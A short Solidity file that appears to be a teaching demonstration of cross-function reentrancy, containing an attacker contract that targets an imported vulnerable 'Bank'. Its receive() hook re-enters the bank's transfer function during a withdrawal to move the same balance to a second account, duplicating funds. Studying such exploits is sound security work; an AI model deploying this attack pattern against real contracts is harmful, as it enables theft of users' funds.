// SPDX-License-Identifier: MIT

pragma solidity 0.8.25;

import "./crossFunctionReentrancy.sol";

contract crossFunctionReentrancyAttack {
    Bank bank;

    address arbitrageAccount;

    constructor(address _bank, address _arbitrageAccount) {
        bank = Bank(_bank);
        arbitrageAccount = _arbitrageAccount;
    }

    function deposit() external payable {
        bank.deposit{value: msg.value}();
    }

    function withdraw() external {
        uint256 balance = bank.balanceOf(address(this));
        bank.withdraw(balance);
    }

    receive() external payable {
        uint256 balance = bank.balanceOf(address(this));
        //If an attacker re-enters the transfer function, they can exploit
        //the situation by duplicating tokens for profit.
        try bank.transfer(arbitrageAccount, balance) {} catch {}
    }
}
